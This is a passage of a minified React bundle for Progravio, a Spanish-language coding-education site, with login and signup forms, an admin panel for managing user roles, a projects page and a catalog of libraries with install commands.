_=d(x.id,j.id),z=k(j.level);return g.jsxs("li",{className:`lesson-item ${t===j.id?"active":""} ${z?"locked-item":""}`,onClick:()=>o(j.id),children:[g.jsxs("div",{className:"lesson-item-header",children:[g.jsx("span",{className:"lesson-status",children:_?"":z?"":""}),g.jsx("span",{className:"lesson-item-title",children:j.title})]}),j.level&&g.jsx("span",{className:`mini-badge ${j.level}`,children:j.level==="semi-senior"?"SS":j.level.charAt(0).toUpperCase()})]},j.id)}):g.jsx("li",{className:"no-lessons",children:"No hay lecciones para este filtro."})})]}),g.jsx("section",{className:"lesson-content",children:B?g.jsxs("div",{className:"lesson-wrapper",children:[k(B.level)&&g.jsxs("div",{className:"level-warning-banner",children:[" Esta leccin es de nivel ",B.level?.toUpperCase(),". Tu nivel actual es ",R,". Puedes intentarlo, pero ser un desafo!"]}),g.jsx(n5,{moduleId:x.id,moduleTitle:x.title,lesson:{...B,completed:d(x.id,B.id)},onComplete:j=>c(x.id,j,x.lessons.length),hasPrev:ue,hasNext:Q,onPrev:w,onNext:I})]}):g.jsx("div",{className:"no-lesson-selected",children:g.jsx("p",{children:x.lessons.length>0?"Selecciona una leccin de la lista para comenzar a aprender.":"An no hay lecciones disponibles para este mdulo."})})})]})]})},r5=()=>{const[a,e]=F.useState(""),[t,o]=F.useState(""),[r,l]=F.useState(""),[c,d]=F.useState(!1),{login:f,loginWithGoogle:p,loginWithFacebook:v,loginWithGithub:y}=or(),S=ir(),A=async L=>{try{l(""),d(!0),await L(),S("/dashboard")}catch(x){l("Error con el inicio de sesin social. Intenta nuevamente."),console.error(x)}finally{d(!1)}},R=async L=>{L.preventDefault(),l(""),d(!0);try{await f(a,t),S("/dashboard")}catch(x){l("Error al iniciar sesin. Verifica tus credenciales."),console.error(x)}finally{d(!1)}};return g.jsxs("div",{className:"auth-container",children:[g.jsx("h1",{className:"auth-title",children:"Bienvenido"}),g.jsx("span",{className:"auth-subtitle",children:"Contina tu aprendizaje en Progravio"}),r&&g.jsx("div",{className:"auth-error",children:r}),g.jsxs("form",{className:"auth-form",onSubmit:R,children:[g.jsxs("div",{className:"form-group",children:[g.jsx("label",{children:"Email"}),g.jsx("input",{type:"email",value:a,onChange:L=>e(L.target.value),placeholder:"tu@email.com",required:!0})]}),g.jsxs("div",{className:"form-group",children:[g.jsx("label",{children:"Contrasea"}),g.jsx("input",{type:"password",value:t,onChange:L=>o(L.target.value),placeholder:"",required:!0})]}),g.jsx("button",{className:"btn-auth",type:"submit",disabled:c,children:c?"Entrando...":"Iniciar Sesin"}),g.jsx("div",{className:"auth-divider",children:g.jsx("span",{children:"O contina con"})}),g.jsxs("div",{className:"social-auth",children:[g.jsx("button",{type:"button",onClick:()=>A(p),className:"btn-social google",title:"Google",children:g.jsx(sj,{})}),g.jsx("button",{type:"button",onClick:()=>A(v),className:"btn-social facebook",title:"Facebook",children:g.jsx(ij,{})}),g.jsx("button",{type:"button",onClick:()=>A(y),className:"btn-social github",title:"GitHub",children:g.jsx(rj,{})})]})]}),g.jsxs("div",{className:"auth-footer",children:["No tienes cuenta? ",g.jsx(Xt,{to:"/register",children:"Regstrate"})]})]})},s5=()=>{const[a,e]=F.useState(""),[t,o]=F.useState(""),[r,l]=F.useState(""),[c,d]=F.useState(""),[f,p]=F.useState(!1),{register:v,loginWithGoogle:y,loginWithFacebook:S,loginWithGithub:A}=or(),R=ir(),L=async D=>{try{d(""),p(!0),await D(),R("/dashboard")}catch(G){d("Error con el registro social. Intenta nuevamente."),console.error(G)}finally{p(!1)}},x=async D=>{if(D.preventDefault(),t!==r)return d("Las contraseas no coinciden");d(""),p(!0);try{await v(a,t),R("/dashboard")}catch(G){d("Error al crear la cuenta. Intenta con otro email."),console.error(G)}finally{p(!1)}};return g.jsxs("div",{className:"auth-container",children:[g.jsx("h1",{className:"auth-title",children:"Crear Cuenta"}),g.jsx("span",{className:"auth-subtitle",children:"nete a la comunidad de Progravio"}),c&&g.jsx("div",{className:"auth-error",children:c}),g.jsxs("form",{className:"auth-form",onSubmit:x,children:[g.jsxs("div",{className:"form-group",children:[g.jsx("label",{children:"Email"}),g.jsx("input",{type:"email",value:a,onChange:D=>e(D.target.value),placeholder:"tu@email.com",required:!0})]}),g.jsxs("div",{className:"form-group",children:[g.jsx("label",{children:"Contrasea"}),g.jsx("input",{type:"password",value:t,onChange:D=>o(D.target.value),placeholder:"",required:!0,minLength:6})]}),g.jsxs("div",{className:"form-group",children:[g.jsx("label",{children:"Confirmar Contrasea"}),g.jsx("input",{type:"password",value:r,onChange:D=>l(D.target.value),placeholder:"",required:!0})]}),g.jsx("button",{className:"btn-auth",type:"submit",disabled:f,children:f?"Creando...":"Registrarse"}),g.jsx("div",{className:"auth-divider",children:g.jsx("span",{children:"O regstrate con"})}),g.jsxs("div",{className:"social-auth",children:[g.jsx("button",{type:"button",onClick:()=>L(y),className:"btn-social google",title:"Google",children:g.jsx(sj,{})}),g.jsx("button",{type:"button",onClick:()=>L(S),className:"btn-social facebook",title:"Facebook",children:g.jsx(ij,{})}),g.jsx("button",{type:"button",onClick:()=>L(A),className:"btn-social github",title:"GitHub",children:g.jsx(rj,{})})]})]}),g.jsxs("div",{className:"auth-footer",children:["Ya tienes cuenta? ",g.jsx(Xt,{to:"/login",children:"Inicia Sesin"})]})]})},l5="https://progravio.onrender.com",c5=async()=>{try{const a=await fetch(`${l5}/projects`);if(!a.ok)throw new Error(`HTTP error! status: ${a.status}`);return await a.json()}catch(a){throw console.error("Failed to fetch projects:",a),a}},u5=()=>{const[a,e]=F.useState([]),[t,o]=F.useState(null),[r,l]=F.useState(!0),[c,d]=F.useState(null);return F.useEffect(()=>{(async()=>{try{l(!0);const p=await c5();e(p),d(null)}catch(p){d("Error al cargar los proyectos. Asegrate de que el servidor est corriendo."),console.error(p)}finally{l(!1)}})()},[]),r?g.jsx("div",{className:"projects-status",children:"Cargando proyectos..."}):c?g.jsx("div",{className:"projects-status error",children:c}):g.jsxs("div",{className:"projects-container",children:[g.jsx("h1",{className:"projects-title",children:"Proyectos Educativos"}),g.jsx("p",{className:"projects-subtitle",children:"Aplica lo aprendido con estos mini-proyectos prcticos."}),g.jsxs("div",{className:"projects-layout",children:[g.jsx("div",{className:"projects-list-section",children:g.jsx("div",{className:"projects-grid",children:a.map(f=>g.jsxs("div",{className:`project-card ${t?.id===f.id?"selected":""}`,onClick:()=>o(f),children:[g.jsx("span",{className:`difficulty-tag ${f.difficulty.toLowerCase()}`,children:f.difficulty}),g.jsx("h3",{children:f.title}),g.jsx("p",{children:f.description}),g.jsx("button",{className:"btn-view-detail",children:"Ver Detalle"})]},f.id))})}),t&&g.jsx("div",{className:"project-detail-section",children:g.jsxs("div",{className:"project-detail-content",children:[g.jsx("button",{className:"btn-close-detail",onClick:()=>o(null),children:""}),g.jsx("h2",{children:t.title}),g.jsx("p",{className:"detail-desc",children:t.description}),g.jsxs("div",{className:"detail-group",children:[g.jsx("h3",{children:"Requerimientos:"}),g.jsx("ul",{children:t.requirements.map((f,p)=>g.jsx("li",{children:f},p))})]}),g.jsxs("div",{className:"detail-group",children:[g.jsx("h3",{children:"ID del Mdulo Relacionado:"}),g.jsx("div",{className:"module-ref",children:t.moduleId})]}),g.jsx("button",{className:"btn-start-project",children:"Comenzar Proyecto"})]})})]})]})},d5=()=>{const{user:a,logout:e}=or(),[t,o]=F.useState("users"),[r,l]=F.useState([]),[c,d]=F.useState(!0),[f,p]=F.useState(null),[v,y]=F.useState(""),[S,A]=F.useState("");F.useEffect(()=>{(async()=>{if(a)try{const D=await a.getIdToken(),G=await fetch("https://progravio.onrender.com/users",{headers:{Authorization:`Bearer ${D}`}});if(!G.ok)throw new Error("Failed to fetch users");const B=await G.json();l(B)}catch(D){console.error("Error fetching users:",D),p(D.message)}finally{d(!1)}})()},[a]);const R=async(x,D)=>{if(a)try{const G=await a.getIdToken(),B=await fetch("https://progravio.onrender.com/users/set-role",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${G}`},body:JSON.stringify({uid:x,role:D})});if(!B.ok){const ee=await B.json();throw new Error(ee.error||"Failed to update role")}l(r.map(ee=>ee.uid===x?{...ee,role:D}:ee)),alert(`Role updated to ${D}`)}catch(G){alert(`Error: ${G.message}`)}},L=async()=>{if(a)try{const x=await fetch("https://progravio.onrender.com/users/setup-admin",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:a.uid,secret:v})}),D=await x.json();x.ok?(A(D.message),alert("Admin rights granted. Please refresh the page.")):A(`Error: ${D.error}`)}catch(x){A(`Error: ${x.message}`)}};return c?g.jsx("div",{className:"admin-container",style:{textAlign:"center",paddingTop:"10rem"},children:"Cargando panel..."}):g.jsxs("div",{className:"admin-container",children:[g.jsxs("header",{className:"admin-header",children:[g.jsxs("div",{children:[g.jsx("h1",{className:"admin-title",children:"Panel de Administracin"}),g.jsxs("p",{style:{color:"var(--text-secondary)",marginTop:"0.5rem"},children:["Bienvenido, ",a?.email]})]}),g.jsx("button",{onClick:async()=>{await e(),window.location.href="/"},className:"admin-logout-btn",children:"Cerrar Sesin"})]}),g.jsxs("div",{className:"admin-tabs",children:[g.jsx("button",{className:`admin-tab ${t==="users"?"active":""}`,onClick:()=>o("users"),children:"Gestin de Usuarios"}),g.jsx("button",{className:`admin-tab ${t==="content"?"active":""}`,onClick:()=>o("content"),children:"Gestin de Contenido"}),g.jsx("button",{className:`admin-tab ${t==="nav"?"active":""}`,onClick:()=>o("nav"),children:"Gestin de Navegacin"})]}),g.jsxs("div",{className:"admin-warning",children:[g.jsx("h3",{children:" Permisos Insuficientes (Demo)"}),g.jsxs("p",{children:["Tu rol actual en Firestore: ",g.jsx("strong",{children:r.find(x=>x.uid===a?.uid)?.role||"user"})]}),g.jsx("p",{children:"Para tener control total del panel de administracin, necesitas:"}),g.jsxs("ol",{style:{paddingLeft:"1.5rem",marginTop:"0.5rem",fontSize:"0.9rem"},children:[g.jsxs("li",{children:["Tener el campo ",g.jsx("code",{children:'role: "admin"'})," en tu documento de Firestore"]}),g.jsx("li",{children:'O usar el botn "Self-Promote" en la pestaa de Usuarios con el secreto correcto'})]})]}),t==="users"&&g.jsxs("div",{className:"admin-card",children:[g.jsx("h2",{children:"Usuarios Registrados"}),f&&g.jsxs("p",{style:{color:"#ef4444",marginBottom:"1rem"},children:["Error: ",f]}),g.jsx("div",{className:"table-container",children:g.jsxs("table",{className:"admin-table",children:[g.jsx("thead",{children:g.jsxs("tr",{children:[g.jsx("th",{children:"Email"}),g.jsx("th",{children:"UID"}),g.jsx("th",{children:"Rol"}),g.jsx("th",{children:"Acciones"})]})}),g.jsxs("tbody",{children:[r.map(x=>g.jsxs("tr",{children:[g.jsx("td",{children:x.email}),g.jsxs("td",{style:{fontFamily:"monospace",opacity:.7},children:[x.uid.substring(0,12),"..."]}),g.jsx("td",{children:g.jsx("span",{className:`role-badge ${x.role==="admin"?"admin":"user"}`,children:x.role||"user"})}),g.jsx("td",{style:{display:"flex",gap:"0.5rem"},children:x.role!=="admin"?g.jsx("button",{className:"action-btn promote",onClick:()=>R(x.uid,"admin"),children:"Hacer Admin"}):g.jsx("button",{className:"action-btn demote",onClick:()=>R(x.uid,"user"),children:"Quitar Admin"})})]},x.uid)),r.length===0&&!f&&g.jsx("tr",{children:g.jsx("td",{colSpan:4,style:{textAlign:"center",padding:"2rem",opacity:.5},children:"No se encontraron usuarios"})})]})]})})]}),t==="content"&&g.jsxs("div",{className:"admin-card",style:{textAlign:"center",padding:"4rem"},children:[g.jsx("h2",{style:{justifyContent:"center"},children:"Gestin de Contenido"}),g.jsx("p",{style:{color:"var(--text-secondary)"},children:"Prximamente: Editor de Markdown y gestin de mdulos."})]}),t==="nav"&&g.jsxs("div",{className:"admin-card",style:{textAlign:"center",padding:"4rem"},children:[g.jsx("h2",{style:{justifyContent:"center"},children:"Gestin de Navegacin"}),g.jsx("p",{style:{color:"var(--text-secondary)"},children:"Prximamente: Reordenar rutas y mens."})]}),g.jsxs("div",{className:"admin-card",style:{border:"1px solid rgba(234, 179, 8, 0.2)"},children:[g.jsx("h2",{style:{color:"#eab308"},children:" Acciones de Emergencia"}),g.jsxs("div",{className:"emergency-form",children:[g.jsx("input",{type:"password",placeholder:"ADMIN_SETUP_SECRET",className:"emergency-input",value:v,onChange:x=>y(x.target.value)}),g.jsx("button",{onClick:L,className:"action-btn emergency-btn",children:"Self-Promote"})]}),S&&g.jsx("p",{style:{marginTop:"1rem",color:"#eab308"},children:S})]})]})},Fo=({children:a})=>{const{user:e,loading:t}=or();return t?g.jsx("div",{style:{display:"flex",justifyContent:"center",alignItems:"center",height:"100vh",backgroundColor:"#0f0f0f",color:"#ffffff"},children:g.jsx("p",{children:"Cargando sesin..."})}):e?g.jsx(g.Fragment,{children:a}):g.jsx(Dx,{to:"/login",replace:!0})},p5=({children:a})=>{const e=F.useContext(Fb);if(!e)throw new Error("AdminRoute must be used within an AuthProvider");const{user:t,loading:o,isAdmin:r}=e;return o?g.jsx("div",{className:"flex justify-center items-center h-screen bg-[#0a0a0a]",children:g.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-500"})}):!t||!r?(console.error("AdminRoute: Access denied.",{hasUser:!!t,uid:t?.uid,role:e.role,isAdmin:r}),g.jsx(Dx,{to:"/",replace:!0})):a},Ap=[{id:"express",name:"Express",packageName:"express",version:"v4.18.2",description:"El framework estndar para servidores web rpidos y minimalistas en Node.js.",icon:g.jsx(Jh,{}),tags:["Backend","HTTP","Web"],link:"https://expressjs.com/"},{id:"nestjs",name:"NestJS",packageName:"@nestjs/core",version:"v10.0.0",description:"Framework progresivo para aplicaciones backend escalables y modulares con arquitectura slida.",icon:g.jsx(xc,{}),tags:["Arquitectura","TypeScript"],link:"https://nestjs.com/"},{id:"fastify",name:"Fastify",packageName:"fastify",version:"v4.21.0",description:"Framework web extremadamente veloz con el menor overhead de recursos posible.",icon:g.jsx(wn,{}),tags:["Rendimiento","Backend"],link:"https://www.fastify.io/"},{id:"apollo",name:"Apollo Server",packageName:"@apollo/server",version:"v4.9.0",description:"La mejor forma de construir una API GraphQL lista para produccin y auto-documentada.",icon:g.jsx(jc,{}),tags:["GraphQL","API"],link:"https://www.apollographql.com/"},{id:"socketio",name:"Socket.io",packageName:"socket.io",version:"v4.7.2",description:"Motor para comunicacin bidireccional en tiempo real basada en eventos.",icon:g.jsx(wn,{}),tags:["Real-time","WebSockets"],link:"https://socket.io/"},{id:"trpc",name:"tRPC",packageName:"@trpc/server",version:"v10.37.0",description:"APIs con tipado seguro de extremo a extremo sin necesidad de generar esquemas.",icon:g.jsx(wn,{}),tags:["Typesafe","RPC"],link:"https://trpc.io/"},{id:"prisma",name:"Prisma",packageName:"prisma",version:"v5.2.0",description:"Siguiente generacin de ORM que hace que trabajar con bases de datos sea intuitivo.",icon:g.jsx(hN,{}),tags:["ORM","Database","SQL"],link:"https://www.prisma.io/"},{id:"drizzle",name:"Drizzle ORM",packageName:"drizzle-orm",version:"v0.28.0",description:"ORM de TypeScript ligero y veloz que se siente como escribir SQL nativo.",icon:g.jsx(wn,{}),tags:["ORM","SQL","Ligero"],link:"https://orm.drizzle.team/"},{id:"mongoose",name:"Mongoose",packageName:"mongoose",version:"v7.4.0",description:"Modelado de objetos elegante para MongoDB, con validacin y esquemas integrados.",icon:g.jsx(Ug,{}),tags:["MongoDB","NoSQL","Esquema"],link:"https://mongoosejs.com/"},{id:"redis",name:"Redis",packageName:"redis",version:"v4.6.7",description:"Almacn de datos en memoria ultrarrpido, ideal para cach y colas de mensajes.",icon:g.jsx(wn,{}),tags:["Cach","NoSQL","Rendimiento"],link:"https://redis.io/"},{id:"reactquery",name:"React Query",packageName:"@tanstack/react-query",version:"v4.29.0",description:"Gestin de peticiones y sincronizacin de estado del servidor sin esfuerzo.",icon:g.jsx(jc,{}),tags:["Estado","Async","Cach"],link:"https://tanstack.com/query"},{id:"zustand",name:"Zustand",packageName:"zustand",version:"v4.3.9",description:"Gestin de estado global minimalista, rpida y basada en hooks para React.",icon:g.jsx($1,{}),tags:["Estado","Hooks","Ligero"],link:"https://zustand-demo.pmnd.rs/"},{id:"rhf",name:"React Hook Form",packageName:"react-hook-form",version:"v7.45.0",description:"Formularios eficientes con validacin de alto rendimiento y mnima re-renderizacin.",icon:g.jsx(tp,{}),tags:["Formularios","Validacin"],link:"https://react-hook-form.com/"},{id:"lucide",name:"Lucide React",packageName:"lucide-react",version:"v0.263.1",description:"Coleccin de iconos hermosa y consistente, optimizada para aplicaciones modernas.",icon:g.jsx(xc,{}),tags:["Iconos","React","SVG"],link:"https://lucide.dev/"},{id:"zod",name:"Zod",packageName:"zod",version:"v3.21.4",description:"Esquemas de validacin con inferencia de tipos de TypeScript esttica y potente.",icon:g.jsx(Pc,{}),tags:["Validacin","TypeScript"],link:"https://zod.dev/"},{id:"fastapi",name:"FastAPI",packageName:"fastapi[all]",version:"v0.100.0",description:"Framework moderno y de alto rendimiento para APIs con Python basada en tipos.",icon:g.jsx(wn,{}),tags:["Python","Backend","API"],link:"https://fastapi.tiangolo.com/"},{id:"django",name:"Django",packageName:"Django",version:"v4.2",description:"El framework web para perfeccionistas con plazos de entrega, robusto y seguro.",icon:g.jsx(tp,{}),tags:["Python","Backend","Fullstack"],link:"https://www.djangoproject.com/"},{id:"pandas",name:"Pandas",packageName:"pandas",version:"v2.0.3",description:"La herramienta definitiva para anlisis de datos y manipulacin de estructuras tabulares.",icon:g.jsx(Br,{}),tags:["Python","Data Science"],link:"https://pandas.pydata.org/"},{id:"numpy",name:"NumPy",packageName:"numpy",version:"v1.25.0",description:"Base para la computacin cientfica en Python con soporte para arrays multidimensionales.",icon:g.jsx($1,{}),tags:["Python","Computacin"],link:"https://numpy.org/"},{id:"wawebjs",name:"WA Web.js",packageName:"whatsapp-web.js",version:"v1.23.0",description:"Librera de Node.js que conecta con WhatsApp Web para automatizar chats y bots.",icon:g.jsx(EN,{}),tags:["WhatsApp","Bot","Node.js","QR Code","Terminal"],link:"https://wwebjs.dev/"},{id:"twilio",name:"Twilio WA",packageName:"twilio",version:"v8.0.0",description:"API empresarial lder para enviar y recibir mensajes de WhatsApp de forma oficial.",icon:g.jsx(Gh,{}),tags:["WhatsApp","API","Cloud"],link:"https://www.twilio.com/whatsapp"},{id:"baileys",name:"Baileys",packageName:"@adiwajshing/baileys",version:"v6.4.1",description:"Librera de Node.js para conectar con WhatsApp sin necesidad de una instancia web.",icon:g.jsx(wn,{}),tags:["WhatsApp","Bot","Messaging","QR Code","Terminal"],link:"https://github.com/WhiskeySockets/Baileys"},{id:"qrterminal",name:"QR Terminal",packageName:"qrcode-terminal",version:"v0.12.0",description:"Genera cdigos QR directamente en la terminal. Ideal para vincular dispositivos y bots.",icon:g.jsx(xc,{}),tags:["Herramientas","Terminal","Node.js"],link:"https://github.com/gtanner/qrcode-terminal"},{id:"tailwind",name:"Tailwind CSS",packageName:"tailwindcss",version:"v3.3.0",description:"Crea interfaces modernas rpidamente sin salir de tu HTML usando clases de utilidad.",icon:g.jsx(tp,{}),tags:["Estilos","CSS","Productividad"],link:"https://tailwindcss.com/",isFeatured:!0},{id:"framer",name:"Framer Motion",packageName:"framer-motion",version:"v10.12.4",description:"La biblioteca definitiva para crear animaciones potentes y fluidas en React.",icon:g.jsx(SN,{}),tags:["Animacin","UI","UX"],link:"https://www.framer.com/motion/"},{id:"shadcn",name:"Shadcn/UI",packageName:"lucide-react clsx tailwind-merge",version:"v0.1.0",description:"Componentes accesibles y personalizables que puedes copiar directamente a tu cdigo.",icon:g.jsx(xc,{}),tags:["Componentes","Diseo"],link:"https://ui.shadcn.com/"},{id:"vitest",name:"Vitest",packageName:"vitest",version:"v0.34.0",description:"Framework de testing ultrarrpido impulsado por Vite. El sucesor moderno de Jest.",icon:g.jsx(wn,{}),tags:["Testing","Backend","Frontend"],link:"https://vitest.dev/"},{id:"playwright",name:"Playwright",packageName:"@playwright/test",version:"v1.37.0",description:"Testing end-to-end confiable para navegadores modernos. El estndar actual de la industria.",icon:g.jsx(jc,{}),tags:["Testing","E2E","Automatizacin"],link:"https://playwright.dev/"},{id:"reacticons",name:"React Icons",packageName:"react-icons",version:"v4.10.0",description:"Acceso a miles de iconos de las libreras ms populares (FontAwesome, AntDesign, etc.) en un solo paquete.",icon:g.jsx(Br,{}),tags:["Frontend","Iconos","UI"],link:"https://react-icons.github.io/react-icons/"},{id:"clsx",name:"Clsx & Tailwind Merge",packageName:"clsx tailwind-merge",version:"v2.0.0",description:"La combinacin perfecta para manejar clases dinmicas en Tailwind sin conflictos.",icon:g.jsx(tp,{}),tags:["Frontend","Estilos","Utilidades"],link:"https://github.com/lukeed/clsx"},{id:"helmet",name:"Helmet",packageName:"helmet",version:"v7.0.0",description:"Asegura tus aplicaciones Express configurando varios headers HTTP. Imprescindible en produccin.",icon:g.jsx(Pc,{}),tags:["Backend","Seguridad"],link:"https://helmetjs.github.io/"},{id:"nodemailer",name:"Nodemailer",packageName:"nodemailer",version:"v6.9.4",description:"La forma ms sencilla de enviar correos electrnicos desde Node.js. Soporta Unicode y adjuntos.",icon:g.jsx(Jh,{}),tags:["Backend","Utilidades"],link:"https://nodemailer.com/"},{id:"flask",name:"Flask",packageName:"Flask",version:"v2.3",description:"Microframework de Python ligero y modular, perfecto para APIs rpidas y prototipos.",icon:g.jsx(wn,{}),tags:["Python","Backend"],link:"https://flask.palletsprojects.com/"},{id:"dotenv",name:"Dotenv",packageName:"dotenv",version:"v16.3.0",description:"Carga variables de entorno desde un archivo .env. Crucial para la seguridad y configuracin.",icon:g.jsx(Pc,{}),tags:["Backend","Configuracin","Utilidades"],link:"https://github.com/motdotla/dotenv"},{id:"axios",name:"Axios",packageName:"axios",version:"v1.5.0",description:"Cliente HTTP basado en promesas que funciona igual de bien en el navegador y Node.js.",icon:g.jsx(jc,{}),tags:["Frontend","Backend","HTTP"],link:"https://axios-http.com/"},{id:"dayjs",name:"Day.js",packageName:"dayjs",version:"v1.11.9",description:"Alternativa minimalista a Moment.js con la misma API. Solo 2KB de peso.",icon:g.jsx(Gh,{}),tags:["Utilidades","Frontend","Backend"],link:"https://day.js.org/"},{id:"recharts",name:"Recharts",packageName:"recharts",version:"v2.8.0",description:"Librera de grficos rediseada para React y construida con SVG, ideal para dashboards.",icon:g.jsx(Br,{}),tags:["Frontend","Visualizacin","UI"],link:"https://recharts.org/"},{id:"authjs",name:"Auth.js",packageName:"next-auth",version:"v4.23.0",description:"La solucin completa para autenticacin en aplicaciones web modernas y Next.js.",icon:g.jsx(Pc,{}),tags:["Backend","Seguridad","Auth"],link:"https://authjs.dev/"},{id:"morgan",name:"Morgan",packageName:"morgan",version:"v1.10.0",description:"Middleware de registro de solicitudes HTTP para Node.js. El estndar para logs de servidor.",icon:g.jsx(Jh,{}),tags:["Backend","Utilidades","Logging"],link:"https://github.com/expressjs/morgan"},{id:"sharp",name:"Sharp",packageName:"sharp",version:"v0.32.5",description:"Procesamiento de imgenes de alto rendimiento en alta velocidad para Node.js.",icon:g.jsx(xc,{}),tags:["Backend","Utilidades","Imgenes"],link:"https://sharp.pixelplumbing.com/"},{id:"swr",name:"SWR",packageName:"swr",version:"v2.2.0",description:"Estrategia de obtencin de datos de Vercel: ligera, rpida y reactiva.",icon:g.jsx(wn,{}),tags:["Frontend","Estado","Sincronizacin"],link:"https://swr.vercel.app/"},{id:"nextjs",name:"Next.js",packageName:"next",version:"v14.0.0",description:"El framework de React para la web. Optimizacin automtica, SSR y rutas de API integradas.",icon:g.jsx(jc,{}),tags:["Fullstack","React","SSR"],link:"https://nextjs.org/"},{id:"astro",name:"Astro",packageName:"astro",version:"v4.0.0",description:"Framework para sitios estticos ultra rpidos. Enva menos JavaScript al navegador.",icon:g.jsx(wn,{}),tags:["Frontend","Performance","Static"],link:"https://astro.build/"},{id:"tanstack-table",name:"TanStack Table",packageName:"@tanstack/react-table",version:"v8.10.0",description:'Librera "headless" para construir tablas y datagrids potentes con control total sobre el diseo.',icon:g.jsx(Br,{}),tags:["Frontend","Tablas","Data"],link:"https://tanstack.com/table"},{id:"polars",name:"Polars",packageName:"polars",version:"v0.19.0",description:"Librera de procesamiento de datos ultrarrpida escrita en Rust. Alternativa de alto rendimiento a Pandas.",icon:g.jsx(Gh,{}),tags:["Python","Data Science","Rust"],link:"https://pola.rs/"},{id:"langchain",name:"LangChain",packageName:"langchain",version:"v0.0.300",description:"Framework para construir aplicaciones potenciadas por LLMs (Modelos de Lenguaje Grandes).",icon:g.jsx(Ug,{}),tags:["AI","Python","LLM"],link:"https://www.langchain.com/"},{id:"pydantic",name:"Pydantic",packageName:"pydantic",version:"v2.4.0",description:"Validacin de datos y gestin de configuraciones para Python usando anotaciones de tipo.",icon:g.jsx(Pc,{}),tags:["Python","Validacin","Backend"],link:"https://docs.pydantic.dev/"}],m5=["Todos","Frontend","Backend","Database","Python","WhatsApp","UI","ORM","Terminal","Testing","Utilidades","AI","Fullstack"],f5=()=>{const{toggleLibraryFavorite:a,isLibraryFavorite:e}=gl(),t=Bn(),[o]=F.useState("npm"),[r,l]=F.useState(""),[c,d]=F.useState("Todos"),[f,p]=F.useState(null);F.useEffect(()=>{const x=new URLSearchParams(t.search).get("id");if(x){const D=document.getElementById(`lib-${x}`);D&&D.scrollIntoView({behavior:"smooth",block:"center"})}},[t]);const v=F.useMemo(()=>Ap.find(L=>L.isFeatured)||Ap[0],[]),y=F.useMemo(()=>{const L=r.toLowerCase();return Ap.filter(x=>{const D=x.name.toLowerCase().includes(L)||x.packageName.toLowerCase().includes(L)||x.tags.some(B=>B.toLowerCase().includes(L)),G=c==="Todos"||x.tags.some(B=>B===c);return D&&G})},[r,c]),S=L=>{if(L.tags.includes("Python"))return`pip install ${L.packageName}`;switch(o){case"yarn":return`yarn add ${L.packageName}`;case"pnpm":return`pnpm add ${L.packageName}`;default:return`npm i ${L.packageName}`}},A=(L,x)=>{const D=S(x);navigator.clipboard.writeText(D),p(L),setTimeout(()=>p(null),2e3)},R=(L,x)=>mt.isValidElement(L)?mt.cloneElement(L,{size:x}):L;return g.jsxs("div",{className:"libraries-container",children:[g.jsx("div",{className:"lib-featured-container",children:g.jsxs("div",{id:`lib-${v.id}`,className:"lib-featured-card",children:[g.jsxs("div",{className:"lib-featured-info",children:[g.jsx("div",{className:"featured-badge",children:"Biblioteca Destacada"}),g.jsxs("h1",{children:["Construye ms rpido con ",g.jsx("span",{children:v.name})]}),g.jsx("p",{children:v.description}),g.jsxs("div",{className:"lib-featured-actions",children:[g.jsxs("a",{href:v.link,target:"_blank",rel:"noopener noreferrer",className:"btn-primary-lib",children:["Ver Documentacin ",g.jsx(zg,{})]}),g.jsxs("div",{className:"featured-install-box",children:[g.jsxs("code",{children:[g.jsx("span",{children:"$"})," ",S(v)]}),g.jsx("button",{className:"copy-mini-btn",onClick:()=>A("featured",v),children:f==="featured"?g.jsx(K1,{size:16,color:"#4ade80"}):g.jsx(Gc,{size:16})})]})]})]}),g.jsx("div",{className:"lib-featured-visual",children:g.jsx("div",{className:"featured-logo-placeholder",children:R(v.icon,120)})})]})}),g.jsxs("div",{className:"lib-controls-container",children:[g.jsxs("div",{className:"lib-categories-bar",children:[g.jsx(gN,{className:"filter-icon-mobile"}),m5.map(L=>g.jsx("button",{className:`category-pill ${c===L?"active":""}`,onClick:()=>d(L),children:L},L))]}),g.jsx("div",{className:"lib-search-bar-container",children:g.jsxs("div",{className:"search-input-wrapper",children:[g.jsx(xN,{size:20}),g.jsx("input",{type:"text",placeholder:"Buscar bibliotecas (JS, Python, WhatsApp, etc.)...",className:"lib-search-input",value:r,onChange:L=>l(L.target.value)})]})})]}),g.jsx("div",{className:"lib-grid-redesign",children:y.map(L=>g.jsxs("div",{id:`lib-${L.id}`,className:"lib-card-redesign",children:[g.jsxs("div",{className:"lib-card-header",children:[g.jsxs("div",{className:"lib-brand",children:[g.jsx("div",{className:"lib-logo-sm",children:R(L.icon,22)}),g.jsxs("div",{className:"lib-title-box",children:[g.jsx("h3",{children:L.name}),g.jsx("span",{className:"lib-version",children:L.version})]})]}),g.jsx("button",{className:`btn-fav ${e(L.id)?"active":""}`,onClick:()=>a(L.id),children:g.jsx(Bg,{size:20,fill:e(L.id)?"#fbbf24":"none"})})]}),g.jsx("p",{title:L.description,children:L.description}),g.jsx("div",{className:"lib-tags-row",children:L.tags.slice(0,3).map(x=>g.jsx("span",{className:"tag-sm",children:x},x))}),g.jsx("div",{className:"lib-card-footer",children:L.id==="rhf"||L.id==="zod"?g.jsx("button",{className:"btn-view-details",onClick:()=>window.open(L.link,"_blank"),children:"Ver Detalles"}):g.jsxs("div",{className:"install-box-sm",children:[g.jsx("code",{children:S(L)}),g.jsx("button",{className:"copy-mini-btn",onClick:()=>A(L.id,L),children:f===L.id?g.jsx(K1,{size:14,color:"#4ade80"}):g.jsx(Gc,{size:14})})]})})]},L.id))})]})},h5=()=>{const{user:a}=or(),e=ir(),{xp:t,calculateLevel:o,favorites:r,favoriteLibraries:l,getModuleProgress:c}=gl(),{level:d,nextLevelXp:f,currentLevelMin:p}=o(t),v=(t-p)/(f-p)*100,y=Object.entries(r),S=F.useMemo(()=>Ap.filter(x=>l.includes(x.id)),[l]),A=F.useMemo(()=>lj.filter(x=>{const D=x.lessons.length;return c(x.id,D)===100}),[c]),R=(x,D)=>mt.isValidElement(x)?mt.cloneElement(x,{size:D}):x,L=x=>{e(`/libraries?id=${x}`)};return 